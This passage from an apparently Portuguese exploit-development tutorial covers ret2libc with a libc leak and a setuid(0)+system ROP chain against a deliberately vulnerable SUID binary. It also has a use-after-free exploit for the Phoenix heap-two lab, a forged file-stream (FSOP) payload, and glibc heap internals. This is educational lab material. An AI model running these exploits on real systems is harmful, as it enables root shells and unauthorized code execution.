-&gt; <code>base = leak - 0x1234</code> -&gt; <code>base = leak - offset</code></p>
<p>Agora, basta criar outra payload e enviar o BoF de novo, so que com: setuid + conex√£o remota + system + exit</p>
<p>Ou o que raios a sua imagina√ß√£o bolar :D</p>
<h1 id="exemplo-3"><a class="header" href="#exemplo-3">Exemplo</a></h1>
<h2 id="vulnc"><a class="header" href="#vulnc">vuln.c</a></h2>
<pre><code class="language-c">#include &lt;stdio.h&gt;
/*
gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln ;
sudo chown root vuln ; 
sudo chmod +s vuln ;
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space ;
checksec vuln ;
*/

/* 
O checksec deve dar:
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
void vuln() {
    puts(&quot;Ola :D ! Qual o seu nome?&quot;);

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
</code></pre>
<h2 id="exploit-2"><a class="header" href="#exploit-2">exploit</a></h2>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = elf = ELF(&quot;vuln&quot;)
libc = elf.libc
rop = ROP(elf)
io = process(elf.path)
io.recvline()

if args.SLEEP: sleep(5)

##################################################
# 
# A plt nao tem seu endereco afetado pelo ASLR
# 
# Entao podemos chamar uma funcao do libc por 
# meio dela, sem precisar de leak
#
# Assim, vamos chamar puts por meio da plt!
#
# Alem disso, a got tambem nao e afetada,
# e ela armazena o endereco das funcoes resolvidas
#
# E oq o puts vai printar? um valor da got!
# Assim, nos dando o leak do libc
#
##################################################

payload = b'A'*40 + flat(
    rop.find_gadget(['pop rdi', 'ret']).address,
    elf.got.puts,
    elf.plt.puts, # call puts(&quot;got.puts&quot;)
    elf.sym.vuln  # voltar pra vuln 
)

io.sendline(payload)

##################################################
#
# Receber leak
#
##################################################

libc.address = int(bytearray(
    io.recvline()[:-1:])[::-1].hex(),
    16) - libc.sym.puts

# &gt;&gt;&gt; leak                                      # Botei um valor qualquer 
#     b'\xf0\xb5[\x16\xc8\x7f\n'
#
# &gt;&gt;&gt; leak[:-1:]                                # Remover \n
#     b'\xf0\xb5[\x16\xc8\x7f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:]).hex()               # converter pra hexstring
#     'f0b55b16c87f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:])[::-1].hex()         # Little Endian
#     '7fc8165bb5f0'
#
# &gt;&gt;&gt; int(bytearray(leak[:-1:])[::-1].hex(),16) # int
#     140497345295856

# Em seguida, leak - offset_puts ===&gt; base_libc

log.success(&quot;Libc Leak: &quot;+hex(libc.address))

##################################################
#
# vuln parte 2, o retorno
#
##################################################

io.recvline()

payload = b'A'*40 + flat(
    # Privesc
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.setuid,
    
    # System
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b&quot;/bin/sh\x00&quot;)),
    libc.sym.system,

    # Exit
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.exit
)

io.sendline(payload)
io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bruteforce-32-bits"><a class="header" href="#bruteforce-32-bits">Bruteforce (32 bits)</a></h1>
<div style="break-before: page; page-break-before: always;"></div><p>Isso e uma tradu√ß√£o / resumo desse post <a href="https://www.nickgregory.me/security/2019/04/06/pivoting-around-memory/">nickgregory: pivoting-around-memory</a></p>
<p>Todos os cr√©ditos vao para o autor original! :D</p>
<h1 id="intro"><a class="header" href="#intro">Intro</a></h1>
<p>Existem 4 regi√µes importantes quando exploitando um programa:</p>
<ul>
<li>O bin√°rio</li>
<li>Stack</li>
<li>LibC</li>
<li>Heap</li>
</ul>
<p>Em resumo:
<img src="stack/./src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" />
<img src="https://raw.githubusercontent.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/main/src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" /></p>
<ul>
<li><a href="stack/leakAll.html#intro">Intro</a></li>
<li><a href="stack/leakAll.html#bin---libc--got">Bin -&gt; LibC : GOT</a></li>
<li><a href="stack/leakAll.html#libc---heap--main_arena-pointers">LibC &lt;-&gt; Heap : main_arena pointers</a></li>
<li><a href="stack/leakAll.html#stack---bin-eou-libc--ler-ret-salvo">Stack -&gt; Bin e/ou LibC : Ler ret salvo</a></li>
<li><a href="stack/leakAll.html#libc---stack--__libc_argv-ou-environ">LibC -&gt; Stack : __libc_argv ou environ</a></li>
<li><a href="stack/leakAll.html#libc---ld---bin">LibC -&gt; ld -&gt; Bin</a></li>
</ul>
<h1 id="bin---libc--got"><a class="header" href="#bin---libc--got">Bin -&gt; LibC : GOT</a></h1>
<p>Se <code>PIE == False</code> ou se voce tem um leak da base do programa, 
basta ler a GOT.</p>
<h1 id="libc---heap--main_arena-pointers"><a class="header" href="#libc---heap--main_arena-pointers">LibC &lt;-&gt; Heap : main_arena pointers</a></h1>
<p>Se voce tem um read arbitr√°rio ou read-after-free, voce pode 
conseguir o endere√ßo do libc se a arena for a main ... 
normalmente como o <code>next</code> pointer nas <code>freelists</code></p>
<p>Seguindo o outro sentido, se voce consegue ler no libc, basta 
ler <code>main_arena</code> para conseguir um pointer para o heap</p>
<h1 id="stack---bin-eou-libc--ler-ret-salvo"><a class="header" href="#stack---bin-eou-libc--ler-ret-salvo">Stack -&gt; Bin e/ou LibC : Ler ret salvo</a></h1>
<p>Ler o valor do ret salvo pode te dar um pointer para uma fun√ß√£o 
do <code>bin</code> (derrotando <code>PIE</code>) ou para uma do <code>LibC</code> (ou de outra lib... o que pode ser util para a exploit chain)</p>
<h1 id="libc---stack--__libc_argv-ou-environ"><a class="header" href="#libc---stack--__libc_argv-ou-environ">LibC -&gt; Stack : __libc_argv ou environ</a></h1>
<p>Se voce tem um read no <code>LibC</code>, voce pode ler os s√≠mbolos: 
<code>__libc_argv</code> ou <code> environ</code>. Eles apontam para valores bem altos 
na stack, e muitas vezes existe uma diferen√ßa <strong>ALEATORIA</strong> 
(<code>ASLR</code>) entre eles e o <code>RSP</code>.</p>
<p>De qualquer maneira, voce tem um leak de um pointer na stack, e 
pode iterar ate encontrar o ret salvo que aponta para 
<code>__libc_start_main</code>, para encontrar a parte importante da stack. </p>
<h1 id="libc---ld---bin"><a class="header" href="#libc---ld---bin">LibC -&gt; ld -&gt; Bin</a></h1>
<p>Nessa tecnica e nescessario passar por um nivel de abstracao, dado 
que o <code>LibC</code> nao tem pointers para <code>Bin</code> ! Assim:</p>
<p><strong>LibC -&gt; ld</strong></p>
<p>O Linker Dinamico (<code>ld</code>) sempre esta na memoria e <code>LibC</code> sempre 
contem pointers para ele: <code>GOT do libc -&gt; _dl_runtime_resolve</code></p>
<p>E na maior parte dos casos, <code>ld</code> esta em um offset constante em 
rela√ß√£o ao <code>LibC</code> pois:</p>
<ul>
<li><code>mmap</code> usa valores alinhados a <code>PAGE_SIZE</code></li>
<li>Normalmente, <code>LibC</code> e <code>ld</code> costumam ser as 2 primeiras libs a 
serem carregadas e portanto &quot;<code>mmap</code>adas&quot;</li>
</ul>
<p><strong>ld -&gt; Bin</strong></p>
<p>O valor <code>name</code> dentro do struct <code>_dl_rtld_libname</code> aponta para 
<code>.interp</code>, mais especificamente para uma string com o <code>path</code> do 
linker, assim, calculando o offset dela dentro de <code>.interp</code> e 
consequentemente leakando a base do <code>Bin</code> .</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="heap"><a class="header" href="#heap">Heap</a></h1>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/intro.html#setup">Setup</a>
<ul>
<li><a href="heap/intro.html#malloc_playground">malloc_playground</a></li>
<li><a href="heap/intro.html#pwndbg">Pwndbg</a></li>
<li><a href="heap/intro.html#villoc--dynamorio">Villoc + DynamoRIO</a></li>
</ul>
</li>
<li><a href="heap/intro.html#teoria">Teoria</a></li>
</ul>
<h1 id="setup-1"><a class="header" href="#setup-1">Setup</a></h1>
<h2 id="malloc_playground"><a class="header" href="#malloc_playground">malloc_playground</a></h2>
<p><code>git clone https://github.com/shellphish/how2heap.git</code></p>
<h2 id="pwndbg"><a class="header" href="#pwndbg">Pwndbg</a></h2>
<ul>
<li>
<p>gdb base: <code>sudo apt-get install gdb</code></p>
</li>
<li>
<p>e os coisos de teste: <code>sudo apt-get install libc6-dbg libc6-dbg:i386 libc6-dbg:amd64</code> caso voce tambem queira arm, mips, sei la,....</p>
</li>
<li>
<p><a href="https://github.com/pwndbg/pwndbg">Github: pwndbg</a></p>
</li>
<li>
<p>ou <a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">Github: gdb-peda-pwndbg-gef </a></p>
</li>
</ul>
<h2 id="villoc--dynamorio"><a class="header" href="#villoc--dynamorio">Villoc + DynamoRIO</a></h2>
<ul>
<li><a href="https://github.com/DynamoRIO/dynamorio/releases">Github: DynamoRIO</a> Ai voce baixa a vers√£o mais recente pra sua plataforma.</li>
<li><a href="https://github.com/wapiflapi/villoc/tree/master/tracers/dynamorio">Github: Villoc</a> e aqui as instru√ß√µes para usar DynamoRIO</li>
</ul>
<p>Mas resumindo, voce baixa o <code>tar</code> do DynamoRIO, extrai em <code>/usr/bin</code> ou <code>local</code>,... ou onde voce preferir</p>
<p>E executa <code>export DYNAMORIO_HOME=/usr/bin/DynamoRIO/</code></p>
<p>Ai voce baixa <code>sudo apt-get install cmake</code></p>
<p>Em seguida voce baixa villoc usando <code>git</code> e executa </p>
<pre><code class="language-bash">git clone https://github.com/wapiflapi/villoc.git
cd villoc/tracers/dynamorio
./build.sh
</code></pre>
<p>Para usar usar basta substituir <code>./target</code> pelo programa e <code>bin64</code> por <code>bin32</code> caso necess√°rio!</p>
<pre><code>$DYNAMORIO_HOME/bin64/drrun  -c villoc_tracer villoc.trace -- ./target

villoc.py villoc.trace out.html
</code></pre>
<p>Se voce mudou o local do villoc, voce tambem precisara mudar <code>villoc_tracer</code> para <code>/usr/bin/villoc/tracers/dynamorio/villoc_tracer</code> (com o local certo)</p>
<p>eu recomendo alterar o seu <code>.bashrc</code> para facilitar :D</p>
<pre><code class="language-bash">PATH=&quot;$PATH:/usr/bin/villoc&quot;
export DYNAMORIO_HOME=/usr/bin/DynamoRIO/

villoc() {
	$DYNAMORIO_HOME/bin64/drrun  -c /usr/bin/villoc/tracers/dynamorio/villoc_tracer villoc.trace -- $1
	villoc.py villoc.trace $1-villoc.html
	firefox $1-villoc.html
}

</code></pre>
<h1 id="teoria-4"><a class="header" href="#teoria-4">Teoria</a></h1>
<ul>
<li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html">1996: Doug Lea - A Memory Allocator</a></li>
<li><a href="https://heap-exploitation.dhavalkapil.com/">dhavalkapil: Heap Exploitation book</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">SploitFUN: sbrk</a> </li>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">SploitFUN: Malloc</a> </li>
<li><a href="https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html">GNU: malloc hooks</a></li>
<li><a href="https://linux.die.net/man/3/__malloc_hook">man: __malloc_hook</a></li>
<li><a href="https://stackoverflow.com/questions/120627/is-there-a-way-to-redefine-malloc-at-link-time-on-windows">stackoverflow: Is there a way to redefine malloc at link time on Windows?</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><pre><code>2ef5c8cae179b2d1dcd9c94fec99254acc18e1db6340048293591d98aee2cadf  phoenix/amd64/heap-two
</code></pre>
<pre><code class="language-py">#!/usr/bin/python
from pwn import *
io = process(&quot;/opt/phoenix/amd64/heap-two&quot;)

def leak(report=True):
    io.recvuntil(&quot;auth = &quot;)
    leak_auth = int(io.recvuntil(',').split(',')[0], 16)
    io.recvuntil(&quot;service = &quot;)
    leak_serv = int(io.recvuntil(']\n').split(&quot;]&quot;)[0], 16)
    if report: 
        log.info(&quot;[ auth = {}, service = {} ]&quot;.format(hex(leak_auth), hex(leak_serv)))
    io.sendline(b&quot;&quot;)
    return (leak_auth, leak_serv)
def auth(name=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;auth &quot; + name)
def service(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;service&quot; + extra)
def reset(extra=b''):
    (leak_auth, leak_serv) = leak(False)
    log.info(&quot;Called free on &quot;+hex(leak_auth))
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;reset&quot; + extra)
def login(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;login&quot; + extra)
    log.success(io.recvuntil(&quot;\n&quot;))

##################################################
auth(b&quot;A&quot;*32) # pointer auth
reset() # free, mas o pointer nao e destruido
service(b&quot;B&quot;*32) # Alloc overlap
leak()
login() # pointer usado after free, apontando para service
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>Coisas uteis pra atacar o heap mas que nao sao exatamente exclusivas aos 
ataques ao heap...</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/relacionados/io_list_all.html#teoria">Teoria</a>
<ul>
<li><a href="heap/relacionados/io_list_all.html#intro">Intro</a></li>
<li><a href="heap/relacionados/io_list_all.html#struct">Struct</a></li>
<li><a href="heap/relacionados/io_list_all.html#campos">Campos</a></li>
<li><a href="heap/relacionados/io_list_all.html#offsets">Offsets</a></li>
</ul>
</li>
<li><a href="heap/relacionados/io_list_all.html#exploit">Exploit</a></li>
</ul>
<h1 id="teoria-5"><a class="header" href="#teoria-5">Teoria</a></h1>
<h2 id="intro-1"><a class="header" href="#intro-1">Intro</a></h2>
<p>No linux, para interagir com os <code>IO</code>s nao se usa o <code>file descriptors (fd)</code> 
padr√µes diretamente, e sim por meio de <code>file streams</code>. Esses sao wrappers que 
trazem funcionalidade adicional como por exemplo: <code>IO buffers</code></p>
<p>Um programa sempre possui 3 file streams, mesmo que nao use input nem output, 
esses sao os <code>stdIOs</code>: <code>stdin</code>, <code>stdout</code> e <code>stderr</code>. Isso quer dizer que essa 
t√©cnica funciona praticamente universalmente! :D</p>
<p>Porem com a evolu√ß√£o de C para C++ , as file streams receberam mais um upgrade: 
agora elas possuem <code>file stream + vtable</code>. Essa <code>vtable</code> possui funcionalidades 
que tornam IO mais fluido.</p>
<p>Por exemplo, quando o programa esta encerrando, para limpar os buffers, a 
fun√ß√£o <code>overflow</code> √© chamada. </p>
<p>Porem como C++ depende muito em C, essas file streams melhoradas foram 
adicionados ao LibC, ie portanto elas est√£o sempre presente em todos programas 
que dependem de C...</p>
<p>Se nos apontarmos essa <code>vtable</code> para uma vtable falsa, podemos alterar o 
<code>overflow</code> e quando o programa encerrar, ganhar execu√ß√£o de c√≥digo!</p>
<h2 id="struct"><a class="header" href="#struct">Struct</a></h2>
<p>As files streams sao definidas por:</p>
<pre><code class="language-C">pwndbg&gt; p *_IO_list_all 
$2 = {
  file = {
    _flags = -72540026,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fd57b9fb680 &lt;_IO_2_1_stdout_&gt;,
    _fileno = 2,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = &quot;&quot;,
    _lock = 0x7fd57b9fc7b0 &lt;_IO_stdfile_2_lock&gt;,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7fd57b9fa760 &lt;_IO_wide_data_2&gt;,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' &lt;repeats 19 times&gt;
  },
  vtable = 0x7fd57b9f7420 &lt;__GI__IO_file_jumps&gt;
}
pwndbg&gt; p *_IO_list_all.vtable 
$3 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x7fd57b6c08a0 &lt;_IO_new_file_finish&gt;,
  __overflow = 0x7fd57b6c12f0 &lt;_IO_new_file_overflow&gt;,
  __underflow = 0x7fd57b6c0f70 &lt;_IO_new_file_underflow&gt;,
  __uflow = 0x7fd57b6c22c0 &lt;__GI__IO_default_uflow&gt;,
  __pbackfail = 0x7fd57b6c3620 &lt;__GI__IO_default_pbackfail&gt;,
  __xsputn = 0x7fd57b6c04a0 &lt;_IO_new_file_xsputn&gt;,
  __xsgetn = 0x7fd57b6c0070 &lt;__GI__IO_file_xsgetn&gt;,
  __seekoff = 0x7fd57b6bf880 &lt;_IO_new_file_seekoff&gt;,
  __seekpos = 0x7fd57b6c26a0 &lt;_IO_default_seekpos&gt;,
  __setbuf = 0x7fd57b6bf160 &lt;_IO_new_file_setbuf&gt;,
  __sync = 0x7fd57b6befe0 &lt;_IO_new_file_sync&gt;,
  __doallocate = 0x7fd57b6b32e0 &lt;__GI__IO_file_doallocate&gt;,
  __read = 0x7fd57b6c0480 &lt;__GI__IO_file_read&gt;,
  __write = 0x7fd57b6bfe70 &lt;_IO_new_file_write&gt;,
  __seek = 0x7fd57b6bf5b0 &lt;__GI__IO_file_seek&gt;,
  __close = 0x7fd57b6bf150 &lt;__GI__IO_file_close&gt;,
  __stat = 0x7fd57b6bfe60 &lt;__GI__IO_file_stat&gt;,
  __showmanyc = 0x7fd57b6c37a0 &lt;_IO_default_showmanyc&gt;,
  __imbue = 0x7fd57b6c37b0 &lt;_IO_default_imbue&gt;

</code></pre>
<h2 id="campos"><a class="header" href="#campos">Campos</a></h2>
<p>Relevante para nos temos: </p>
<ul>
<li>chain
<ul>
<li>Aponta para a proxima file stream assim, formando um singly linked list.
<ul>
<li>Normalmente contendo os <code>std IO</code>s</li>
</ul>
</li>
<li>Nos podemos altera-lo e apontar para o heap, e no heap criar uma file stream falsa.</li>
</ul>
</li>
<li>Vtable
<ul>
<li>overflow: podemos apontar para um one_gadget ou system</li>
</ul>
</li>
<li>Flags
<ul>
<li>Quando forjamos uma file stream falsa e chamamos <code>overflow</code>, <code>flags</code> sera 
passado por meio do <code>RDI</code>.</li>
<li>Assim podemos colocar <code>flags = /bin/sh</code> e <code>overflow = system</code> </li>
</ul>
</li>
<li>Prote√ß√µes: No futuro provavelmente vai ter mais, mas no m√≠nimo voce deve esperar:
<ul>
<li>write_ptr &gt; write_base</li>
<li>mode = 0
<ul>
<li>obs: os primeiros 4 bytes de mode podem ser afetados por ASLR, tornando seu exploit funcional apenas 50% da vezes.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="offsets"><a class="header" href="#offsets">Offsets</a></h2>
<ul>
<li>
<p>File: 0x20</p>
<ul>
<li>flags: 0x0 </li>
<li>write_base: 0x20</li>
<li>write_ptr: 0x28</li>
<li>chain: 0x68</li>
<li>mode: 0xc0</li>
</ul>
</li>
<li>
<p>Vtable: 0xd0</p>
<ul>
<li>Overflow: 0x18 (em realacao a vtable)</li>
</ul>
</li>
</ul>
<h1 id="exploit-3"><a class="header" href="#exploit-3">Exploit</a></h1>
<p>Ent√£o recapitulando, nos podemos forjar uma file stream falsa no heap ou stack, 
e apontar <code>_IO_list_all</code> ou alguma das <code>chain</code>s para ela.</p>
<p>Alem disso, podemos simplesmente alterar a <code>vtable</code> ou somente o <code>overflow dentro da vtable </code> de um dos <code>std IO</code>s.</p>
<p>Nos caso mais complexo, caso tenhamos um pointer para a nossa file stream falsa 
podemos apontar <code>_IO_list_all</code> para <code>pointer - 0x68</code>, fazendo com que o segundo 
item na <code>linked list formada pelas chains</code> seja a nossa file stream falsa.</p>
<p>A nossa file stream falsa precisa conter valores que passem pelas restri√ß√µes 
mencionadas anteriormente e possua uma vtable falsa que aponte o seu overflow 
para system. Assim, quando o programa sair, nos conseguiremos uma shell.</p>
<p>A maior parte dos outros valores nao importam, portanto uma file stream falsa 
poderia ser definida por:</p>
<pre><code class="language-py">flat(
    b&quot;/bin/sh\0&quot;,#                    flags | 0x00
    0,0,0,
    1,#                          write base | 0x20
    2,#                           write ptr | 0x28
    '\0'*8*20,#   mode ta no meio desses 0s
    libc.sym.system,#              overflow | 0xc8
    fake_file_stream +0xc8 -0x18,#   vtable | 0xd0
)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>Nos tutoriais a seguir voce aprendera t√©cnicas para atacar o alocador de 
memoria do libc: malloc</p>
<p>Porem, nao pense nao t√©cnicas como: receitinhas que funcionam numa vers√£o 
especifica do libc</p>
<p>Pense nelas como conceitos gerais e abstratos, que podem ser aplicados em 
outros alocadores de memoria... O malloc costuma ser o alvo mais comum para 
pesquisadores pois √© o alocador que teve mais medidas de seguranca adicionadas.</p>
<p>obs: isso nao quer dizer que √© o mais seguro, ok? ok!</p>
<p>Por exemplo, voce pode interpretar as diferentes t√©cnicas como: o que acontece 
se eu alterar esse peda√ßo de meta-dados deixando-o grande? e pequeno? e zero? 
E aquele outro peda√ßo de meta-dados, e se eu mudar ele?.... etc etc</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="teoria-6"><a class="header" href="#teoria-6">Teoria</a></h1>
<ul>
<li><a href="heap/malloc/teoria.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/teoria.html#chunk">Chunk</a></li>
<li><a href="heap/malloc/teoria.html#top">Top</a></li>
<li><a href="heap/malloc/teoria.html#arena">Arena</a></li>
<li><a href="heap/malloc/teoria.html#binlists">Binlists</a>
<ul>
<li><a href="heap/malloc/teoria.html#fastbins">Fastbins</a></li>
<li><a href="heap/malloc/teoria.html#unsorted-bin">Unsorted bin</a>
<ul>
<li><a href="heap/malloc/teoria.html#remaindering">Remaindering</a></li>
</ul>
</li>
<li><a href="heap/malloc/teoria.html#small-bins">Small Bins</a></li>
<li><a href="heap/malloc/teoria.html#large-bins">Large Bins</a></li>
</ul>
</li>
<li><a href="heap/malloc/teoria.html#outras-opera%C3%A7%C3%B5es">Outras opera√ß√µes</a></li>
</ul>
<p>O Heap √© composto por chunks, alocados por meio de <code>malloc()</code> e liberados por meio de <code>free()</code>.</p>
<p>Malloc recebe normalmente 1 par√¢metro: tamanho! Porem esse valor a esse valor √© 
adicionado <code>0x08</code> e arredondado para cima. Por exemplo:</p>
<ul>
<li>malloc(0x18) -&gt; 0x20 -&gt; 0x20</li>
<li>malloc(0x20) -&gt; 0x28 -&gt; 0x30</li>
<li>malloc(1)    -&gt; 0x20 TAMANHO MINIMO!</li>
</ul>
<p>Esse √© o tamanho (<code>size</code>) do chunk!</p>
<h1 id="chunk"><a class="header" href="#chunk">Chunk</a></h1>
<p>O chunk, quando alocado consiste em:</p>
<pre><code>0000000000000000        size      -&gt; Lembrando que size inclui os metadados
0000000000000000 0000000000000000 &lt;- dados do usu√°rio
0000000000000000 0000000000000000
</code></pre>
<p>A vis√£o do usu√°rio e a vis√£o interna de um chunk sao diferentes:</p>
<pre><code class="language-x86asm">0000000000000000 0000000000000031 &lt;- vis√£o malloc
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB &lt;- vis√£o usu√°rio
CCCCCCCCCCCCCCCC EEEEEEEEEEEEEEEE
FFFFFFFFFFFFFFFF 0000000000000020 &lt;- vis√£o malloc
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB &lt;- vis√£o usu√°rio
CCCCCCCCCCCCCCCC 
</code></pre>
<p>Nos vamos usar a vis√£o do malloc daqui em diante! Portanto:
<code>Chunk + 0x08 -&gt; size</code> e <code>Chunk + 0x10 -&gt; dados</code> </p>
<p>O tamanho do chunk, por ser alinhado a 16 bytes, nas usa os √∫ltimos 4 bits do size,
e assim eles sao usados pra flags:</p>
<ul>
<li>1 - PREV_INUSE
<ul>
<li><code>1</code> se o <code>chunk adjacente anterior</code> esta em uso (nao free)</li>
<li>Se o <code>chunk anterior</code> esta livre (<code>0</code>), o nosso chunk rouba a ultima qword (a 
logo antes do <code>size</code>) para armazenar o <code>size do chunk anterior</code>: <code>PREV_SIZE</code></li>
</ul>
</li>
<li>2 - IS_MMAPPED
<ul>
<li><code>1</code> se o chunk foi adquirido via <code>mmap</code> </li>
<li>Os outros bits sao ignorados pois: 
<ul>
<li>Nao possui chunks adjacente</li>
<li>Nao faz parte de uma arena</li>
</ul>
</li>
</ul>
</li>
<li>4 - NON_MAIN_ARENA
<ul>
<li><code>0</code> se esta na <code>main_arena</code></li>
<li><code>1</code> se esta em qualquer outra thread</li>
</ul>
</li>
<li>8 - Sem uso atualmente</li>
</ul>
<h1 id="top"><a class="header" href="#top">Top</a></h1>
<p>O chunk <code>top</code> fica na borda do heap:</p>
<pre><code class="language-x86asm">0000000000000000 0000000000000031 &lt;- chunk 1
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB
CCCCCCCCCCCCCCCC EEEEEEEEEEEEEEEE 
FFFFFFFFFFFFFFFF 0000000000000020 &lt;- chunk 2
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB
CCCCCCCCCCCCCCCC 0000000000003f41 &lt;- top
</code></pre>
<p>O top chunk tem um tamanho enorme, e quando nos alocamos um novo chunk, estamos 
tirando uma fatia dele.</p>
<p>Se ele ficar pequeno de mais, pode ser extendido por meio da syscall <code>sbrk</code> (system 
break)</p>
<p>O system break √© um limite de quanta memoria nos podemos gastar, e √© controlado pelo 
sistema operacional.</p>
<p>Alem disso, caso o chunk que passe do limite do <code>top</code> seja enorme (0x5000 por 
exemplo) ao env√©s de gastar o <code>top</code> todo e precisar chamar <code>srbk</code>, basta alocar o 
espa√ßo desse chunk em outro canto usando <code>mmap</code>.</p>
<h1 id="arena"><a class="header" href="#arena">Arena</a></h1>
<p>Uma arena √© um agregador de metadados referentes a aquele heap, com cada thread tendo
uma. A da main thread √© chamada de <code>main_arena</code> !</p>
<p>Entre os metadados armazenados nos temos, por exemplo:</p>
<ul>
<li>Endere√ßo do top chunk</li>
<li>Head das binlists</li>
<li>Pointer para outras arenas</li>
<li>Quanta memoria o sistema operacional disponibilizou</li>
</ul>
<p>A main_arena √© uma vari√°vel global, enquanto as outras sao segmentos de heap!</p>
<p>O comportamento do <code>top</code> descrito anteriormente somente ocorre na main_arena</p>
<h1 id="binlists"><a class="header" href="#binlists">Binlists</a></h1>
<p>Quando um chunk nao √© mais util, voce pode chamar <code>free()</code> passando o chunk como 
par√¢metro!</p>
<p>Quando um chunk √© liberado, ele √© colocado em uma binlist e a sua estrutura muda!</p>
<p>Binlists sao linked lists (single ou double | circular ou nao circular) que 
armazenam os free chunks, com cada chunk sendo um node na list.</p>
<p>Sao as head dessas binlists que sao armazenadas na main arena!</p>
<p>Elas sao classificadas pelo tamanho do chunk que armazenam:</p>
<ul>
<li>Fastbins: 0x20, 0x30,....., 0x80</li>
<li>Unsorted bin: * </li>
<li>smallbins</li>
<li>largebins</li>
</ul>
<h3 id="fastbins"><a class="header" href="#fastbins">Fastbins</a></h3>
<p>Os fastbins sao usados para rapidamente alocar e liberar chunks.</p>
<p>Cada um deles contem uma singly-linked-list de chunks de mesmo tamanho. </p>
<p>O local aonde ficaria os <code>dados</code>, em um free chunk sera usado para metadados, e 
no caso dos fastbins, por ser uma singly-linked-list somente um pointer (<code>FD</code>) para 
o proximo chunk na lista.</p>
<p>Alem disso, essa lista √© nao circular, isto √©: o ultimo chunk tem FD=0 (NULL)</p>
<p>Como os fastbins nao sao consolidados com outros free chunks adjacentes, eles sempre
possuem <code>PREV_INUSE</code>=<code>1</code></p>
<p>Ent√£o por exemplo um chunk do fastbin 0x30 contem: </p>
<pre><code class="language-x86asm">0000000000000000     size=0x31
        FD       0000000000000000
0000000000000000 0000000000000000
0000000000000000
</code></pre>
<p>Alem disso, os fastbins sao <code>LIFO</code>, assim como uma stack:</p>
<pre><code class="language-C++">head: chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

free(chunk 4)
head: chunk 4 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

malloc()
head: chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

free(chunk 5)
head: chunk 5 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

free(chunk 10)
head: chunk 10 -&gt; chunk 5 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

malloc()
head: chunk 5 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)
</code></pre>
<p>Ent√£o por exemplo:</p>
<pre><code class="language-C++">C√≥digo:
malloc() 6 vezes
free(Chunk 4)
free(Chunk 2)
free(Chunk 5)
free(Chunk 3)

Main Arena:
Fastbin 0x20 = &amp; Chunk 3   
Fastbin 0x20 : Chunk 3 -&gt; Chunk 5 -&gt; Chunk 2 -&gt; Chunk 4 -&gt; 0 (NULL)

Heap:
0000000000000000 0000000000000021 &lt;- Chunk 1
0000000000000000 0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 2 - Fastbin 0x20 [3]
    &amp; Chunk 4    0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 3 - Fastbin 0x20 [4]
    &amp; Chunk 5    0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 4 - Fastbin 0x20 [0]
   00000 (NULL)  0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 5 - Fastbin 0x20 [1]
    &amp; Chunk 2    0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 6
0000000000000000 0000000000000000
0000000000000000 0000000000003d11 &lt;- top
</code></pre>
